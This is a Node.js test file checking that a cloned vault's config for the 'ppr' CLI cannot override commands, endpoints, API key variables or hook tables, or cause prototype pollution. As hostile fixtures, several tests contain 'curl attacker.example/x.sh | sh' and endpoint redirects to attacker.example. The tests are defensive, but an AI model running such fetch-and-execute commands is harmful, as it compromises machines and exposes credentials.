import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DEFAULT_CONFIG, USER_ONLY_KEYS, guardVaultScope, setPath } from '../dist/index.js';
import { loadConfig } from '../dist/node.js';

/**
 * Two config layers on disk and none of the developer's own: `loadConfig` takes
 * its environment, so the global layer and the vault both live under one temp
 * directory that goes away afterwards. Layers are written as raw JSON text
 * because one of these tests needs a literal `__proto__` key.
 */
async function effectiveConfig({ global, vault }) {
  const dir = await mkdtemp(join(tmpdir(), 'ppr-config-'));
  const configHome = join(dir, 'config');
  const root = join(dir, 'vault');
  try {
    await mkdir(join(configHome, 'ppr'), { recursive: true });
    await mkdir(join(root, '.ppr'), { recursive: true });
    if (global) await writeFile(join(configHome, 'ppr', 'config.json'), global);
    if (vault) await writeFile(join(root, '.ppr', 'config.json'), vault);
    return await loadConfig(root, { XDG_CONFIG_HOME: configHome, HOME: dir });
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

test('a cloned vault cannot make ppr run its own command', async () => {
  const config = await effectiveConfig({
    global: JSON.stringify({
      ai: { provider: 'command', command: 'my-local-llm' },
      transcribe: { provider: 'whisper-cpp', binary: '/opt/whisper/whisper-cli' },
    }),
    vault: JSON.stringify({
      ai: { command: 'curl attacker.example/x.sh | sh' },
      transcribe: { command: 'curl attacker.example/x.sh | sh', binary: '/tmp/evil' },
      display: { listLimit: 5 },
    }),
  });

  assert.equal(config.ai.command, 'my-local-llm');
  assert.equal(config.transcribe.command, undefined);
  assert.equal(config.transcribe.binary, '/opt/whisper/whisper-cli');
  assert.equal(config.transcribe.provider, 'whisper-cpp');
  // The fence is narrow on purpose: a vault still gets to say how it is read.
  assert.equal(config.display.listLimit, 5);
});

test('a cloned vault cannot redirect your model endpoint or your API key', async () => {
  const config = await effectiveConfig({
    global: JSON.stringify({
      ai: {
        provider: 'openai',
        model: 'gpt-4o-mini',
        baseUrl: 'https://api.openai.com/v1',
        apiKeyEnv: 'OPENAI_API_KEY',
      },
    }),
    vault: JSON.stringify({
      ai: { baseUrl: 'https://attacker.example/v1', apiKeyEnv: 'OPENAI_API_KEY' },
      transcribe: { baseUrl: 'https://attacker.example', apiKeyEnv: 'OPENAI_API_KEY' },
    }),
  });

  assert.equal(config.ai.baseUrl, 'https://api.openai.com/v1');
  assert.equal(config.ai.apiKeyEnv, 'OPENAI_API_KEY');
  assert.equal(config.transcribe.baseUrl, undefined);
  assert.equal(config.transcribe.apiKeyEnv, undefined);
});

test('a cloned vault cannot switch ppr to the provider that shells out', async () => {
  const config = await effectiveConfig({
    global: JSON.stringify({ ai: { provider: 'ollama', model: 'llama3.2' } }),
    vault: JSON.stringify({ ai: { provider: 'command', command: 'curl attacker.example | sh' } }),
  });

  assert.equal(config.ai.provider, 'ollama');
  assert.equal(config.ai.command, undefined);
});

test('one trailing space does not walk a provider past the fence', async () => {
  const config = await effectiveConfig({
    global: JSON.stringify({
      ai: { provider: 'ollama', model: 'llama3.2', command: 'my-local-llm' },
      transcribe: { provider: 'openai', command: 'my-local-whisper' },
    }),
    // Config is trimmed *after* the merge, so an untrimmed comparison in the
    // fence let "command " through and `ppr ask` ran `my-local-llm`.
    vault: JSON.stringify({ ai: { provider: 'command ' }, transcribe: { provider: ' command\n' } }),
  });

  assert.equal(config.ai.provider, 'ollama');
  assert.equal(config.transcribe.provider, 'openai');
});

test('a cloned vault cannot switch ppr to a transcriber that shells out', async () => {
  // Both shell out: `command` runs `transcribe.command`, `whisper-cpp` runs
  // `transcribe.binary` (or whatever `whisper-cli` is on PATH).
  for (const provider of ['command', 'whisper-cpp']) {
    const config = await effectiveConfig({
      global: JSON.stringify({
        transcribe: {
          provider: 'openai',
          command: 'my-local-whisper {file}',
          binary: '/opt/whisper/whisper-cli',
        },
      }),
      vault: JSON.stringify({ transcribe: { provider } }),
    });

    assert.equal(config.transcribe.provider, 'openai', `vault set transcribe.provider=${provider}`);
  }
});

test('a config file cannot reach Object.prototype through __proto__', async () => {
  const config = await effectiveConfig({
    global: '{"__proto__": {"pollutedByGlobal": true}}',
    vault: '{"__proto__": {"polluted": true}, "ai": {"model": "still-merged"}}',
  });

  assert.equal({}.polluted, undefined);
  assert.equal({}.pollutedByGlobal, undefined);
  assert.equal(Object.getPrototypeOf(config), Object.prototype);
  assert.equal(Object.hasOwn(config, '__proto__'), false);
  // The rest of the layer is ordinary config and still applies.
  assert.equal(config.ai.model, 'still-merged');
});

test('your own machine still names the command, the endpoint, and the key variable', async () => {
  const config = await effectiveConfig({
    global: JSON.stringify({
      ai: {
        provider: 'command',
        command: 'llm -m mistral',
        baseUrl: 'http://127.0.0.1:1234/v1',
        apiKeyEnv: 'MY_API_KEY',
      },
      transcribe: {
        provider: 'command',
        command: 'whisper {file}',
        binary: '/usr/local/bin/whisper-cli',
        baseUrl: 'http://127.0.0.1:9000',
        apiKeyEnv: 'MY_TRANSCRIBE_KEY',
      },
    }),
    vault: '{}',
  });

  assert.equal(config.ai.provider, 'command');
  assert.equal(config.ai.command, 'llm -m mistral');
  assert.equal(config.ai.baseUrl, 'http://127.0.0.1:1234/v1');
  assert.equal(config.ai.apiKeyEnv, 'MY_API_KEY');
  assert.equal(config.transcribe.provider, 'command');
  assert.equal(config.transcribe.command, 'whisper {file}');
  assert.equal(config.transcribe.binary, '/usr/local/bin/whisper-cli');
  assert.equal(config.transcribe.baseUrl, 'http://127.0.0.1:9000');
  assert.equal(config.transcribe.apiKeyEnv, 'MY_TRANSCRIBE_KEY');
});

test('setting one of those keys for a single vault is refused, and says where it belongs', () => {
  for (const path of [
    'ai.command',
    'ai.baseUrl',
    'ai.apiKeyEnv',
    'transcribe.command',
    'transcribe.binary',
    'transcribe.baseUrl',
    'transcribe.apiKeyEnv',
  ]) {
    assert.throws(
      () => guardVaultScope(path, 'anything'),
      (err) => err.code === 'EINVALID' && err.message.includes(path) && err.hint.includes('~/.config/ppr/config.json'),
      `${path} should be refused with --local`,
    );
  }
  assert.throws(() => guardVaultScope('ai.provider', 'command'), /cannot be set for one vault/);
  // The write-time half of the fence answers exactly what `loadConfig` drops.
  for (const [path, value] of [
    ['ai.provider', 'command '],
    ['transcribe.provider', 'command'],
    ['transcribe.provider', 'whisper-cpp'],
    ['transcribe.provider', ' command\n'],
  ]) {
    assert.throws(
      () => guardVaultScope(path, value),
      (err) =>
        err.code === 'EINVALID' &&
        err.message.includes(path) &&
        err.hint.includes('~/.config/ppr/config.json'),
      `${path}=${JSON.stringify(value)} should be refused with --local`,
    );
  }
  // Everything else is still a per-vault setting.
  guardVaultScope('ai.provider', 'ollama');
  guardVaultScope('transcribe.provider', 'openai');
  guardVaultScope('display.listLimit', '5');
  guardVaultScope('capture.defaultKind', 'note');
});

test('a table of programs to run never survives a merge, whichever layer wrote it', async () => {
  // `hooks` and `porcelain` are the same danger with two names: both say which
  // program ppr should run, and the vault layer wins every ordinary key — so a
  // cloned vault would otherwise get to answer `--notify`. Neither is a field
  // on `Config` at all, and `validateConfig` drops what a merge produced, so
  // there is no merged config for anything downstream to find one in.
  const config = await effectiveConfig({
    global: JSON.stringify({
      hooks: { 'entry.created': ['ppr-notify'] },
      porcelain: { notify: '/opt/mine --urgent' },
    }),
    vault: JSON.stringify({
      hooks: { 'entry.created': ['curl attacker.example/x.sh | sh'] },
      porcelain: { notify: 'curl attacker.example/x.sh | sh' },
      display: { listLimit: 5 },
    }),
  });

  assert.equal(config.hooks, undefined);
  assert.equal(config.porcelain, undefined);
  // Even the user's own copy is absent here: the merged config is not the way
  // either one is read. `cli/src/hooks.ts` and `cli/src/porcelain.ts` read the
  // global layer directly, which is what makes the layer impossible to spoof.
  assert.equal(config.display.listLimit, 5);
});

test('neither table is settable with `ppr config set`, at any scope', () => {
  for (const path of ['hooks', 'hooks.entry.created', 'porcelain', 'porcelain.notify', 'porcelain.reminders-push']) {
    assert.throws(
      () => setPath(DEFAULT_CONFIG, path, 'echo hi'),
      (err) =>
        err.code === 'EINVALID' &&
        /not settable with/.test(err.message) &&
        err.hint.includes('~/.config/ppr/config.json'),
      `${path} should be refused and name the file`,
    );
  }
  // One guard, so a key that merely starts with the same letters is not caught
  // by it — `plugins.*` is the namespace nobody polices.
  setPath(DEFAULT_CONFIG, 'plugins.porcelain-ish.style', 'loud');
});

test('the refusal names the table, whichever tables are on the list', () => {
  // Driven off the exported list rather than off two spelled-out paths, because
  // the failure this is about is a *third* table: the labels live in a second
  // structure, and while that was keyed by `string` a table with no label
  // compiled clean and told the user "undefined are not settable".
  for (const key of USER_ONLY_KEYS) {
    assert.throws(
      () => setPath(DEFAULT_CONFIG, key, 'echo hi'),
      (err) => {
        const [label] = err.message.split(' are not settable');
        return err.code === 'EINVALID' && Boolean(label) && label !== 'undefined';
      },
      `${key} should be refused by name`,
    );
  }
});
